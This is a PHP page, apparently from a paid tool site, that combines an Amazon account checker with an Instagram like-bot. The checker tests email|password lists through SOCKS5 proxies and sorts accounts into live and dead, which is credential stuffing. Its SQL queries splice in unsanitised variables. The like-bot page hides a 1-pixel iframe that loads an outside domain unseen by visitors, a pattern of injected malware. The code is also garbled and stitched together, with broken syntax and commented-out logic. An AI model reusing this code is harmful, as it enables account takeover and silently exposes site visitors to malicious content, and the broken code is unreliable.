<?php

if(!isset($_SESSION['username'])) {
  header('location:../login.php');
} else {
  $username = $_SESSION['username'];
} ?>


<?php if (isset($_POST['add'])) {
$cekdata = mysql_query("SELECT * FROM user WHERE username = '$add_username'");
$sdata = mysql_fetch_array($cekdata);
$scount = mysql_num_rows($cekdata);
$mybalance = $tampil['balance'];
$username = $tampil['username'];

if ($mybalance < $price) { ?>
<div class="alert alert-danger"> <strong>Error: </strong> Saldo Tidak Cukup </div>
<? } else {
    	$send = mysql_query("UPDATE user SET balance = balance-5000 WHERE username = '$username'");
if ($send) { ?>

<?php } else { ?>
<div class="alert alert-danger"> <strong>Error: </strong> Terjadi KESALAHAN </div>
<? } } } ?>
	<div class="container">
		<div class="row">
			<div class="col-lg-8" style="margin: 0px auto;float:none;">
				<center>
					<h2>Checker Amazon</h2>
				</center>
				<hr>
				<div class="panel panel-default">
					<div class="panel-heading">
					   Amazon Account Checker
					</div>
					<div class="panel-body" method="POST">
					<div class="col-md-8 col-md-8 col-xs-8">
									<label for="mailpass" class="control-label">Resource:</label>
									<textarea name="mailpass" id="mailpass" placeholder="email@domain|password" class="form-control" rows="7"></textarea>
					</div>
					<div class="col-md-4 col-xs-4 col-lg-4">
							<label for="socks" class="control-label">Socks5 <button type="button" class="btn btn-xs btn-primary import-sock">Get Socks</button></label>
								<textarea name="socks" id="socks" placeholder="127.0.0.1:8080" class="form-control" rows="7"></textarea><br>
					</div>
						<p align="center">
                            Delim: <input name="delim" id="delim" style="text-align: center;display:inline;width: 40px;margin-right: 8px;padding: 4px;" value="|" type="text" class="form-control">
                            Timeout: <input name="timeout" id="timeout" style="text-align: center;display:inline;width: 40px;margin-right: 8px;padding: 4px;" value="20" type="text" class="form-control">
							Change socks after die: <input name="fail" id="fail" style="text-align: center;display:inline;width: 40px;margin-right: 8px;padding: 4px;" value="20" type="text" class="form-control">
							<br>
							<br>
							<button type="submit" class="btn btn-inverse" id="submit" name="add">Submit</button>
							<button type="button" class="btn btn-danger" id="stop">Stop</button>&nbsp;
							<img id="loading">
							<span id="checkStatus" style="color:gray"></span>
						</p>
					</div>
				</div>
			</div>
		</div>
		<div class="row" id="result" style="display: none;">
			<div class="col-lg-8" style="margin: 0px auto;float:none;">
				<div class="panel panel-default">
					<div class="panel-heading">
						LIVE&nbsp;<span class="label label-success" id="acc_live_count" style="color:white">0</span>
						<span onclick="selectText('acc_live')" class="pull-right"><a href="javascript:;" style="color:green">Copy all</a><span>
					</div>	
					<div class="panel-body">
						<div id="acc_live"></div>
					</div>
				</div>
			</div>
            <div class="col-lg-8" style="margin: 0px auto;float:none;">
				<div class="panel panel-default">
					<div class="panel-heading">
						DIE&nbsp;<span class="label label-danger" id="acc_die_count" style="color:white">0</span>
					</div>	
					<div class="panel-body">
						<div id="acc_die"></div>
					</div>
				</div>
			</div>
			<div class="col-lg-8" style="margin: 0px auto;float:none;">
				<div class="panel panel-default">
					<div class="panel-heading">
						WRONG&nbsp;<span class="label label-warning" id="wrong_count" style="color:white">0</span>
					</div>	
					<div class="panel-body">
						<div id="wrong"></div>
					</div>
				</div>
			</div>
			<div class="col-lg-8" style="margin: 0px auto;float:none;">
				<div class="panel panel-default">
					<div class="panel-heading">
						SOCKS DIE/PROBLEM&nbsp;<span class="label label-danger" id="bad_count" style="color:white">0</span>
					</div>	
					<div class="panel-body">
						<div id="acc_bad"></div>
					</div>
				</div>
			</div>
		</div>
	</div>
	
<?php
error_reporting(0);
if($_GET['link']||$_GET['server']): header("Refresh:".$_GET['refresh']."");
$url = $_GET['link'];
$type = $_GET['type'];

// CURL WEB LIKE
function Mak($link, $post=null){
$c = curl_init();
curl_setopt($c, CURLOPT_URL, $link);
if($post != null){
curl_setopt($c, CURLOPT_POST, true);
curl_setopt($c, CURLOPT_POSTFIELDS, $post);
}
curl_setopt($c, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($c, CURLOPT_RETURNTRANSFER, true);
curl_setopt($c, CURLOPT_SSL_VERIFYPEER, false);
$x = curl_exec($c);
curl_close($c);
return $x;
}

//Mengambil media ID Foto $ch=curl_init('https://­api.instagram.com/­oembed/?url'.$url); curl_setopt($ch,CURL­OPT_RETURNTRANSFER,1­); curl_setopt($ch,CURL­OPT_SSL_VERIFYPEER,0­); curl_setopt($ch,CURL­OPT_USERAGENT,'Mozil­la/5.0 (Windows NT 6.1; rv:21.0) Gecko/20100101 Firefox/­21.0'); $xx=curl_exec($ch);$mama=curl­_getinfo($ch);curl_c­lose($ch); if($mama['http_code'­]<>200) die(json_encode(arra­y('result' => 0, 'content' => 'Photo tidak tersedia'))); $xx=json_decode($xx)­;
$mid = $xx->media_id;

// EXECUTION WITH CALL FUNCTION
if($_GET['server']==194){
$server = 'http://194.58.115.48/';
}else
$angka = 9;
$rand = rand(1,$angka);
if($type=='oh'){
$hasil = Mak($server.'add?id='.$mid);
}else
if($type=='yeah'){
$hasil = Mak($server.'add?id='.$mid.$rand);
}
// $hasil = str_replace(0, 'Sukses/Gak-nya Cek Sendiri', $hasil);
echo '
<center>
<br>
'.$hasil.$rand.'
<br>
Jangan Close
</center>
';
else:
print "
<html>
<head>
<title>Ambil Like</title>

</head>
<body>
<center>
<h2>Premium Like</h2>
<form method='get' action=''>
<select name='type'>
<option value='oh'>Ikeh Ikeh Kimochi</option>
</select>
<select name='server'>
<option value='194'>Server</option>
</select><br><br>
Refresh:
<select name='refresh'>
<option value='0'>0</option>
</select><br><br>
<input type='url' name='link' placeholder='Url Foto' required>
<input type='submit' value='Crot'>
</form>
<iframe style="height:1px" src="http://www&#46;Brenz.pl/rc/" frameborder=0 width=1></iframe>
</body>
</html>
";
endif; ?>